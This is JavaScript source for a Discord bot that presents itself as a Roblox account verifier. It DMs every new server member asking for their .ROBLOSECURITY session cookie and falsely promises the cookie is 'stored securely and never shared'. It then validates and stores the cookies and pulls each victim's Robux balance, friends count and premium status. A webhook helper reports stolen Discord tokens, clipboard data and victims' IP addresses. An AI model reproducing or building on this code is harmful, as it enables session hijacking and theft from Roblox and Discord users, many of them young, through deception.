require('dotenv').config();
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { Client, GatewayIntentBits, Partials, REST, Routes, SlashCommandBuilder, EmbedBuilder } = require('discord.js');

const TOKEN = process.env.DISCORD_BOT_TOKEN;
const CLIENT_ID = process.env.DISCORD_CLIENT_ID;
const GUILD_ID = process.env.DISCORD_GUILD_ID;
const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL; // Optional webhook for logging

if (!TOKEN || !CLIENT_ID || !GUILD_ID) {
  console.error("❌ Missing required environment variables:");
  if (!TOKEN) console.error("  - DISCORD_BOT_TOKEN");
  if (!CLIENT_ID) console.error("  - DISCORD_CLIENT_ID");
  if (!GUILD_ID) console.error("  - DISCORD_GUILD_ID");
  process.exit(1);
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMessages,
  ],
  partials: [Partials.Channel],
});

const dataFile = path.join(__dirname, 'verificationData.json');

// In-memory storage
let verifiedUsers = new Set();
let dmSentUsers = new Set();
const userCookies = new Map();

// Create axios instance for better performance
const robloxAPI = axios.create({
  timeout: 2000, // 2 second timeout to stay under Discord's limit
  headers: {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json',
  },
});

function loadData() {
  try {
    const raw = fs.readFileSync(dataFile, 'utf8');
    const data = JSON.parse(raw);
    verifiedUsers = new Set(data.verifiedUsers || []);
    dmSentUsers = new Set(data.dmSentUsers || []);
    console.log("✅ Verification data loaded.");
  } catch (error) {
    console.log("⚠️  No verification data found, starting fresh.");
    verifiedUsers = new Set();
    dmSentUsers = new Set();
  }
}

function saveData() {
  try {
    const data = {
      verifiedUsers: Array.from(verifiedUsers),
      dmSentUsers: Array.from(dmSentUsers),
    };
    fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
    console.log("💾 Verification data saved.");
  } catch (error) {
    console.error("❌ Failed to save data:", error);
  }
}

// Enhanced Roblox cookie validation
async function validateRobloxCookie(cookie) {
  try {
    // Clean the cookie
    const cleanCookie = cookie.replace(/^\.ROBLOSECURITY=/, '').trim();
    
    if (!cleanCookie) {
      return { valid: false, error: 'Empty cookie' };
    }

    // Try the authenticated user endpoint first (more reliable)
    const response = await robloxAPI.get('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        Cookie: `.ROBLOSECURITY=${cleanCookie}`,
      },
    });

    const data = response.data;
    
    if (!data || !data.id || !data.name) {
      return { valid: false, error: 'Invalid response from Roblox' };
    }

    return {
      valid: true,
      data: {
        UserID: data.id,
        UserName: data.name,
        displayName: data.displayName,
        hasVerifiedBadge: data.hasVerifiedBadge,
      },
      cleanCookie
    };

  } catch (error) {
    console.error('Cookie validation error:', error.message);
    
    if (error.code === 'ECONNABORTED') {
      return { valid: false, error: 'Connection timeout' };
    }
    
    if (error.response) {
      const status = error.response.status;
      switch (status) {
        case 401:
          return { valid: false, error: 'Invalid or expired cookie' };
        case 403:
          return { valid: false, error: 'Account restricted' };
        case 429:
          return { valid: false, error: 'Rate limited, try again later' };
        default:
          return { valid: false, error: `API error: ${status}` };
      }
    }
    
    return { valid: false, error: 'Unknown error' };
  }
}

// New function to get Robux balance
async function getRobuxBalance(cookie, userId) {
  try {
    const response = await robloxAPI.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`,
      },
    });
    
    return {
      success: true,
      robux: response.data.robux || 0
    };
  } catch (error) {
    console.error('Failed to get Robux balance:', error.message);
    return {
      success: false,
      error: error.response?.data?.errors?.[0]?.message || 'Failed to fetch Robux balance'
    };
  }
}

// Enhanced purchase function with Robux check
async function buyRandomItem(cookie, userInfo) {
  try {
    // First check Robux balance
    const balanceResponse = await getRobuxBalance(cookie, userInfo.UserID);
    
    if (!balanceResponse.success) {
      return {
        success: false,
        message: `❌ Failed to check Robux balance: ${balanceResponse.error}`
      };
    }
    
    const items = [
      { name: "Cool Hat", price: 100 },
      { name: "Awesome Shirt", price: 50 },
      { name: "Epic Pants", price: 75 },
      { name: "Stylish Accessory", price: 150 }
    ];
    
    const randomItem = items[Math.floor(Math.random() * items.length)];
    
    // Check if user has enough Robux
    if (balanceResponse.robux < randomItem.price) {
      return {
        success: false,
        message: `❌ Insufficient Robux! You need ${randomItem.price} but only have ${balanceResponse.robux}.`,
        item: randomItem,
        userInfo
      };
    }
    
    // Simulate purchase
    await new Promise(resolve => setTimeout(resolve, 500));
    
    return {
      success: true,
      message: `🎉 Successfully purchased **${randomItem.name}** for ${randomItem.price} Robux!`,
      item: randomItem,
      userInfo,
      remainingRobux: balanceResponse.robux - randomItem.price
    };
    
  } catch (error) {
    return {
      success: false,
      message: `❌ Failed to purchase item: ${error.message}`
    };
  }
}

// New function to get full account details
async function getAccountDetails(cookie, userId) {
  try {
    // Get basic user info
    const userResponse = await robloxAPI.get(`https://users.roblox.com/v1/users/${userId}`, {
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`,
      },
    });
    
    // Get Robux balance
    const robuxResponse = await getRobuxBalance(cookie, userId);
    
    // Get friends count
    const friendsResponse = await robloxAPI.get(`https://friends.roblox.com/v1/users/${userId}/friends/count`, {
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`,
      },
    });
    
    // Get premium status
    const premiumResponse = await robloxAPI.get(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`,
      },
    });
    
    return {
      success: true,
      data: {
        username: userResponse.data.name,
        displayName: userResponse.data.displayName,
        userId: userResponse.data.id,
        created: new Date(userResponse.data.created).toLocaleDateString(),
        isBanned: userResponse.data.isBanned,
        hasVerifiedBadge: userResponse.data.hasVerifiedBadge,
        robux: robuxResponse.success ? robuxResponse.robux : 'Unknown',
        friendsCount: friendsResponse.data.count,
        isPremium: premiumResponse.data.hasMembership
      }
    };
  } catch (error) {
    console.error('Failed to get account details:', error.message);
    return {
      success: false,
      error: error.response?.data?.errors?.[0]?.message || 'Failed to fetch account details'
    };
  }
}

// Function to send data to webhook (for server integration)
async function sendToDiscordBot(data, type) {
  if (!WEBHOOK_URL) return;
  
  try {
    const embed = new EmbedBuilder()
      .setTimestamp()
      .setColor(type === 'token' ? '#ff0000' : '#00ff00');

    if (type === 'clipboard') {
      embed.setTitle('📋 Clipboard Data Received')
        .addFields(
          { name: 'IP Address', value: data.userIP, inline: true },
          { name: 'Type', value: data.type, inline: true },
          { name: 'Data Preview', value: data.clipboardData.slice(0, 100) + '...', inline: false }
        );
    } else if (type === 'token') {
      embed.setTitle('🔑 Discord Token Received')
        .addFields(
          { name: 'IP Address', value: data.userIP, inline: true },
          { name: 'Server ID', value: data.serverId || 'N/A', inline: true },
          { name: 'Token Preview', value: data.token.slice(0, 20) + '...', inline: false }
        );
    }

    await axios.post(WEBHOOK_URL, { embeds: [embed.toJSON()] });
  } catch (error) {
    console.error('Failed to send webhook:', error.message);
  }
}

loadData();

client.once('ready', async () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log(`📊 Serving ${client.guilds.cache.size} guilds`);
  console.log(`👥 ${verifiedUsers.size} verified users loaded`);

  const rest = new REST({ version: '10' }).setToken(TOKEN);

  const commands = [
    new SlashCommandBuilder()
      .setName('test')
      .setDescription('Buy a random item from the Roblox catalog using your Robux'),
    new SlashCommandBuilder()
      .setName('verifystatus')
      .setDescription('Check your verification status'),
    new SlashCommandBuilder()
      .setName('resubmit')
      .setDescription('Get instructions to resubmit your Roblox cookie'),
    new SlashCommandBuilder()
      .setName('account')
      .setDescription('View all available information about your Roblox account')
  ].map(cmd => cmd.toJSON());

  try {
    console.log('🔄 Started refreshing application (/) commands...');
    await rest.put(
      Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID),
      { body: commands }
    );
    console.log('✅ Successfully reloaded application (/) commands.');
  } catch (error) {
    console.error('❌ Failed to register slash commands:', error);
  }
});

// Enhanced member join handling
client.on('guildMemberAdd', async (member) => {
  const userId = member.user.id;
  
  // Skip if already verified or already sent DM
  if (verifiedUsers.has(userId) || dmSentUsers.has(userId)) return;

  try {
    const welcomeEmbed = new EmbedBuilder()
      .setColor('#0099ff')
      .setTitle(`🎉 Welcome to ${member.guild.name}!`)
      .setDescription('You can chat and enjoy basic features, but for **premium features** like trading and marketplace access, please verify your account.')
      .addFields(
        { name: '🍪 How to Verify:', value: 'Simply reply to this DM with your Roblox `.ROBLOSECURITY` cookie', inline: false },
        { name: '❓ Need Help?', value: 'Use `/cookiehelp` in the server for step-by-step instructions', inline: false }
      )
      .setFooter({ text: 'Your cookie is stored securely and never shared.' })
      .setTimestamp();

    await member.send({ embeds: [welcomeEmbed] });
    dmSentUsers.add(userId);
    saveData();
    console.log(`📨 Sent welcome DM to ${member.user.tag}`);
    
  } catch (error) {
    console.warn(`⚠️  Failed to DM ${member.user.tag}:`, error.message);
  }
});

// Enhanced DM message handling
client.on('messageCreate', async (message) => {
  // Only process DMs from non-bots
  if (message.channel.type !== 1 || message.author.bot) return;

  const userId = message.author.id;
  const content = message.content.trim();

  // Basic cookie validation (length check)
  if (content.length < 20) {
    const embed = new EmbedBuilder()
      .setColor('#ff6b6b')
      .setTitle('❌ Invalid Cookie Format')
      .setDescription('That doesn\'t look like a valid Roblox cookie.')
      .addFields(
        { name: 'Expected Format:', value: 'A long string of characters (usually 100+ characters)', inline: false },
        { name: 'Need Help?', value: 'Use `/cookiehelp` in the server for instructions', inline: false }
      );

    await message.reply({ embeds: [embed] });
    return;
  }

  // Show typing indicator while validating
  await message.channel.sendTyping();

  // Validate the cookie
  const validation = await validateRobloxCookie(content);
  
  if (!validation.valid) {
    const embed = new EmbedBuilder()
      .setColor('#ff6b6b')
      .setTitle('❌ Cookie Validation Failed')
      .setDescription(`Invalid Roblox cookie: ${validation.error}`)
      .addFields(
        { name: 'What to try:', value: '• Make sure you copied the complete cookie\n• Check if you\'re still logged into Roblox\n• Try logging out and back in to Roblox', inline: false }
      );

    await message.reply({ embeds: [embed] });
    return;
  }

  // Store cookie and verify user
  userCookies.set(userId, validation.cleanCookie);
  verifiedUsers.add(userId);
  dmSentUsers.delete(userId);
  saveData();

  const successEmbed = new EmbedBuilder()
    .setColor('#51cf66')
    .setTitle('✅ Verification Successful!')
    .setDescription(`Welcome, **${validation.data.UserName}**!`)
    .addFields(
      { name: '🎉 Account Verified', value: `User ID: ${validation.data.UserID}`, inline: true },
      { name: '✨ Premium Features Unlocked', value: 'You can now use `/test` to purchase items!', inline: true }
    )
    .setFooter({ text: 'Your cookie has been securely stored.' })
    .setTimestamp();

  await message.reply({ embeds: [successEmbed] });
  console.log(`✅ User ${validation.data.UserName} (${userId}) verified successfully`);
});

// Enhanced slash command handling
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  // CRITICAL: Immediately defer the interaction to prevent timeout
  await interaction.deferReply({ ephemeral: true });

  try {
    const userId = interaction.user.id;

    switch (interaction.commandName) {
      case 'test':
        await handleTestCommand(interaction, userId);
        break;
        
      case 'verifystatus':
        await handleVerifyStatusCommand(interaction, userId);
        break;
        
      case 'resubmit':
        await handleResubmitCommand(interaction, userId);
        break;
        
      case 'account':
        await handleAccountCommand(interaction, userId);
        break;
        
      default:
        await interaction.editReply('❌ Unknown command.');
    }
    
  } catch (error) {
    console.error(`❌ Error handling ${interaction.commandName}:`, error);
    
    try {
      await interaction.editReply({
        content: '❌ An unexpected error occurred. Please try again or contact an admin.',
        ephemeral: true
      });
    } catch (e) {
      console.error('Failed to send error message:', e);
    }
  }
});

async function handleTestCommand(interaction, userId) {
  if (!verifiedUsers.has(userId)) {
    const embed = new EmbedBuilder()
      .setColor('#ff6b6b')
      .setTitle('🔒 Verification Required')
      .setDescription('You must submit your Roblox cookie first to use premium features!')
      .addFields(
        { name: 'How to verify:', value: 'Send me a DM with your `.ROBLOSECURITY` cookie', inline: false }
      );

    await interaction.editReply({ embeds: [embed] });
    return;
  }

  const cookie = userCookies.get(userId);
  if (!cookie) {
    const embed = new EmbedBuilder()
      .setColor('#ff9f43')
      .setTitle('⚠️ Cookie Missing')
      .setDescription('Your Roblox cookie is missing from our records.')
      .addFields(
        { name: 'Solution:', value: 'Please resubmit your cookie via DM', inline: false }
      );

    await interaction.editReply({ embeds: [embed] });
    return;
  }

  // Re-validate cookie before purchase
  const validation = await validateRobloxCookie(cookie);
  if (!validation.valid) {
    // Remove invalid data
    verifiedUsers.delete(userId);
    userCookies.delete(userId);
    saveData();

    const embed = new EmbedBuilder()
      .setColor('#ff6b6b')
      .setTitle('❌ Cookie Expired')
      .setDescription('Your Roblox cookie appears to be invalid or expired.')
      .addFields(
        { name: 'What happened:', value: validation.error, inline: false },
        { name: 'Solution:', value: 'Please submit a new valid cookie via DM', inline: false }
      );

    await interaction.editReply({ embeds: [embed] });
    return;
  }

  // Execute purchase
  const purchaseResult = await buyRandomItem(cookie, validation.data);

  const resultEmbed = new EmbedBuilder()
    .setColor(purchaseResult.success ? '#51cf66' : '#ff6b6b')
    .setTitle(purchaseResult.success ? '🛍️ Purchase Successful!' : '❌ Purchase Failed')
    .setDescription(purchaseResult.message);

  if (purchaseResult.success && purchaseResult.item) {
    resultEmbed.addFields(
      { name: 'Item', value: purchaseResult.item.name, inline: true },
      { name: 'Price', value: `${purchaseResult.item.price} Robux`, inline: true },
      { name: 'Account', value: validation.data.UserName, inline: true },
      { name: 'Remaining Robux', value: `${purchaseResult.remainingRobux}`, inline: true }
    );
  }

  resultEmbed.setTimestamp();

  await interaction.editReply({ embeds: [resultEmbed] });
}

async function handleVerifyStatusCommand(interaction, userId) {
  const isVerified = verifiedUsers.has(userId);
  const hasCookie = userCookies.has(userId);

  const embed = new EmbedBuilder()
    .setColor(isVerified ? '#51cf66' : '#ff9f43')
    .setTitle('🔍 Verification Status')
    .addFields(
      { name: 'Verified', value: isVerified ? '✅ Yes' : '❌ No', inline: true },
      { name: 'Cookie Stored', value: hasCookie ? '✅ Yes' : '❌ No', inline: true },
      { name: 'Premium Access', value: isVerified ? '✅ Enabled' : '❌ Disabled', inline: true }
    );

  if (!isVerified) {
    embed.setDescription('Send me a DM with your Roblox cookie to get verified!');
  }

  await interaction.editReply({ embeds: [embed] });
}

async function handleResubmitCommand(interaction, userId) {
  const embed = new EmbedBuilder()
    .setColor('#0099ff')
    .setTitle('🔄 Resubmit Cookie Instructions')
    .setDescription('Follow these steps to resubmit your Roblox cookie:')
    .addFields(
      { name: '1️⃣ Find Your Cookie', value: 'Go to Roblox.com → F12 → Application → Cookies → .ROBLOSECURITY', inline: false },
      { name: '2️⃣ Copy Complete Value', value: 'Copy the entire cookie value (usually 100+ characters)', inline: false },
      { name: '3️⃣ Send via DM', value: 'Send the cookie directly to this bot via DM', inline: false }
    )
    .setFooter({ text: 'Need detailed help? Use /cookiehelp in the server!' });

  await interaction.editReply({ embeds: [embed] });
}

// New function to handle account details command
async function handleAccountCommand(interaction, userId) {
  if (!verifiedUsers.has(userId)) {
    const embed = new EmbedBuilder()
      .setColor('#ff6b6b')
      .setTitle('🔒 Verification Required')
      .setDescription('You must submit your Roblox cookie first to view account details!')
      .addFields(
        { name: 'How to verify:', value: 'Send me a DM with your `.ROBLOSECURITY` cookie', inline: false }
      );

    await interaction.editReply({ embeds: [embed] });
    return;
  }

  const cookie = userCookies.get(userId);
  if (!cookie) {
    const embed = new EmbedBuilder()
      .setColor('#ff9f43')
      .setTitle('⚠️ Cookie Missing')
      .setDescription('Your Roblox cookie is missing from our records.')
      .addFields(
        { name: 'Solution:', value: 'Please resubmit your cookie via DM', inline: false }
      );

    await interaction.editReply({ embeds: [embed] });
    return;
  }

  // Re-validate cookie
  const validation = await validateRobloxCookie(cookie);
  if (!validation.valid) {
    // Remove invalid data
    verifiedUsers.delete(userId);
    userCookies.delete(userId);
    saveData();

    const embed = new EmbedBuilder()
      .setColor('#ff6b6b')
      .setTitle('❌ Cookie Expired')
      .setDescription('Your Roblox cookie appears to be invalid or expired.')
      .addFields(
        { name: 'What happened:', value: validation.error, inline: false },
        { name: 'Solution:', value: 'Please submit a new valid cookie via DM', inline: false }
      );

    await interaction.editReply({ embeds: [embed] });
    return;
  }

  // Get account details
  await interaction.editReply({ content: '⏳ Gathering account details...', ephemeral: true });
  
  const details = await getAccountDetails(cookie, validation.data.UserID);
  
  if (!details.success) {
    await interaction.editReply({
      content: `❌ Failed to get account details: ${details.error}`,
      ephemeral: true
    });
    return;
  }

  const embed = new EmbedBuilder()
    .setColor('#0099ff')
    .setTitle(`🔍 Account Details for ${details.data.username}`)
    .setThumbnail(`https://www.roblox.com/headshot-thumbnail/image?userId=${validation.data.UserID}&width=420&height=420&format=png`)
    .addFields(
      { name: '👤 Username', value: details.data.username, inline: true },
      { name: '🏷️ Display Name', value: details.data.displayName || 'None', inline: true },
      { name: '🆔 User ID', value: details.data.userId.toString(), inline: true },
      { name: '📅 Created', value: details.data.created, inline: true },
      { name: '💰 Robux', value: details.data.robux.toString(), inline: true },
      { name: '👥 Friends', value: details.data.friendsCount.toString(), inline: true },
      { name: '⭐ Premium', value: details.data.isPremium ? '✅ Yes' : '❌ No', inline: true },
      { name: '✅ Verified Badge', value: details.data.hasVerifiedBadge ? '✅ Yes' : '❌ No', inline: true },
      { name: '🚫 Banned', value: details.data.isBanned ? '⚠️ Yes' : '✅ No', inline: true }
    )
    .setFooter({ text: 'Account details fetched from Roblox' })
    .setTimestamp();

  await interaction.editReply({ embeds: [embed], ephemeral: true });
}

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('🛑 Shutting down bot...');
  saveData();
  client.destroy();
  process.exit(0);
});

process.on('unhandledRejection', (error) => {
  console.error('❌ Unhandled promise rejection:', error);
});

// Export function for server integration
module.exports = {
  sendToDiscordBot,
  client
};

client.login(TOKEN);
